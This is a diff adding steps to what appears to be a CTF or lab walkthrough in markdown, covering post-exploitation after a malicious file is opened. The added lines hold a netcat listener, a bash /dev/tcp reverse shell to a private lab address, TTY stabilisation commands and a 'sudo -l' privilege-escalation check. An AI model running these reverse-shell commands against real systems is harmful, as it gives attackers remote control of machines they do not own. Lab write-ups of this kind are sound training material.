@@ -65,8 +65,46 @@ we open our malicious file
 ![image](https://github.com/user-attachments/assets/1b72181e-44c5-4d1a-bf28-54c93568d82c)
 
 we have conexion!!!
+
 ![image](https://github.com/user-attachments/assets/03b641b6-97cd-4fc6-96db-941fd855c6ec)
 
+To stabilize the connection we will send the traffic to another of our ports.
+```bash
+nc nlvp 444
+```
+![image](https://github.com/user-attachments/assets/8ef08de8-fa7f-4353-b569-5468cebabdaf)
+
+
+```bash
+bash -c "sh -i >& /dev/tcp/192.168.1.228/444 0>&1"
+```
+![image](https://github.com/user-attachments/assets/d671a70c-f134-40f5-b447-2fe1407e95d4)
+
+We already have a new connection
+
+![image](https://github.com/user-attachments/assets/ccc3cd25-5388-4e40-b689-58111ec9aa1c)
+
+now we will make a treatment of the tty
+
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+Finally we have a treated and stabilized tty
+
+![image](https://github.com/user-attachments/assets/7618d11b-74e2-4a92-b1b8-c845616ac316)
+
+Now we will escalate privileges
+
+```bash
+sudo -l
+```
+![image](https://github.com/user-attachments/assets/89003549-6cc4-405f-9eb1-0aec574ae83c)
+![image](https://github.com/user-attachments/assets/f8135744-7786-4d69-876f-bcc989e65687)
 
 
 
